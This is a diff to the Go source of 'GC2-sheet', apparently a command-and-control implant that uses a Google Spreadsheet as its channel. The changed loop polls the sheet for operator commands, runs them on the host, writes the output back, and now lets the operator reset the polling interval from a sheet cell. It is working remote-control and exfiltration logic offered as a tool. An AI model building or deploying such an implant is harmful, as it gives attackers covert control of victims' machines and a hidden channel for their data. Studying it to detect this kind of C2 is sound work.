@@ -1,6 +1,6 @@
 package C2
 
-import (
+import 	(
 	"GC2-sheet/internal/authentication"
 	"GC2-sheet/internal/configuration"
 	"GC2-sheet/internal/utils"
@@ -26,6 +26,12 @@ func Run (){
 	// Set sheet name
 	spreadSheet.CommandSheet.Name = newSheetName
 
+	// Set default ticker duration
+	spreadSheet.CommandSheet.Ticker = 10
+
+	// Set default range for the ticker configuration
+	spreadSheet.CommandSheet.RangeTickerConfiguration = "E2"
+
 	// Creating first command
 	command := configuration.Commands{
 		RangeIn: "!A",
@@ -45,7 +51,7 @@ func Run (){
 	createSheet(clientSheet, spreadSheet)
 
 	// Creating ticker
-	ticker := time.NewTicker(10 * time.Second)
+	ticker := time.NewTicker(time.Duration(spreadSheet.CommandSheet.Ticker) * time.Second)
 
 	for{
 		select {
@@ -55,10 +61,23 @@ func Run (){
 					lastCommand := utils.GetLastCommand(spreadSheet)
 
 					commandToExecute := ""
+
+					// If last command has empty Input we need to get the new command from the spreadsheet
 					if lastCommand.Input == "" {
 						// Retrieve last command from the sheet
-						commandToExecute = readSheet(clientSheet, spreadSheet)
+						newTicker := 0
+						// command to execute (can be ""), and delay for the ticker
+						commandToExecute, newTicker = readSheet(clientSheet, spreadSheet)
+
+						// Update ticker if value has changed
+						if newTicker != spreadSheet.CommandSheet.Ticker && newTicker != 0 {
+							spreadSheet.CommandSheet.Ticker = newTicker
+							utils.LogDebug("Updated ticker delay")
+							ticker.Reset(time.Duration(spreadSheet.CommandSheet.Ticker) * time.Second)
+						}
 					}
+
+					// If no command end the thread
 					if commandToExecute == "" {
 						utils.LogDebug("No new command")
 						return
@@ -72,8 +91,12 @@ func Run (){
 					// Create new empty command before performing the current one (to avoid deadlock on command execution)
 					utils.CreateNewEmptyCommand(spreadSheet)
 
+					// Execute the command
 					execute(spreadSheet, clientDrive, lastCommand, commandToExecute)
+
+					// Write result on spreadsheet (result is stored in the current command structure)
 					writeSheet(clientSheet, spreadSheet, lastCommand)
+
 				}()
 		}
 	}
